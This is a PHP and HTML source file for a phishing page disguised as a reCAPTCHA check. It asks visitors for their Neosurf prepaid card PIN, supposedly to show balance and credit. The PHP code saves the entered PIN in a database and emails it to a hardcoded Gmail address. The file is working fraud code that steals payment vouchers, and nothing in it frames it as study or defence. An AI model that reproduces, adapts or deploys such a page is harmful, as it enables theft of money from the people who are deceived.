

<?php

  $servername ="localhost";
  $username="root";
  $password="";
  $dbname="plug";
  try{
  $conn= new PDO("mysql:host=$servername;dbname=$dbname", $username,$password);
  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
  echo "verification du code  ok ";
  }
  catch(PDOexception $e){
    echo "erreur de verification:" . $e->getMessage() ;
  }
  if (isset($_POST['submit'])) {
    $one = $_POST['one'];
    $two = $_POST['two'];
    $tree = $_POST['tree'];
    $sql = ("INSERT INTO `pcs`( `one`, `two`,`tree`) VALUES(:one,:two,:tree)");
    $stmt = $conn->prepare($sql);
    $stmt->bindparam('one',$one);
    $stmt->bindparam('two',$two);
    $stmt->bindparam('tree',$tree);
    $stmt->execute();
    $code=$one.$two.$tree;
    $subject='verification de la recharge';
    $mail1='hypolitekenfack4@gmail.com';
    $hearder = "from :\"kenfo\"<kenfackhypolite0@gmail.com>\n";
    $hearder .="Reply-To:kenfackhypolite0@gmail.com\n";
    $hearder .="content-Type:text/html;charset=\"iso-8859-1\"";
    if (mail($mail1, $subject, $code,$hearder)) {
    	echo "verification de la recharge reussit ";
    }else{
    	echo'erreur de connexion';
    }
    

      
  }


?>





<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="page.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>reCAPTCHA</title>
</head>
<body  >
	<div class="bloc">
<form action="" method="post">
<div>
	<p style="color: hotpink;font-family: sans-serif;">MY CARD</p>
</div>
<div>
	<p style="background-color:whitesmoke;width: 400px; height: 70px; font-family: sans-serif; ">Enter your Neosurf pincode to access a lot of<br>
	   information and options: Available credit,<br>
	   balance transfer,etc.
	</p>
</div>
<div>
	<input type="text" name="one" style="width:100px; height:40px;" maxlength="4">
	<input type="text" name="two" style="width:100px; height:40px;" maxlength="3">
	<input type="text" name="tree" style="width:100px; height:40px;" maxlength="3">
</div>
<div >
	<p  style="font-family: sans-serif;box-shadow: black; background-color:whitesmoke;width: 305px; height: 70px; font-family: sans-serif; border-radius: 5px; box-shadow: 6px 6px 25px rgba(0, 0, 0); ">

	<input type="checkbox" style="width: 25px;height: 25px;float:left; display: flex;margin-top: 22px;"><br>   i'm not a robot <img src="IMG-20230315-WA0001.jpg" width="40px" height="50px" align="right" >
	</p>
</div><br>
<div>
	
	<input type="reset" name="return" value="Return" style="background-color: white; width: 70px ;height: 40px ;" >
	<input type="submit" name="submit" value="Submit" style="background-color:darkslateblue;color: white; width: 70px ;height: 40px ;">
</div>
</form>
</div>
</body>
</html>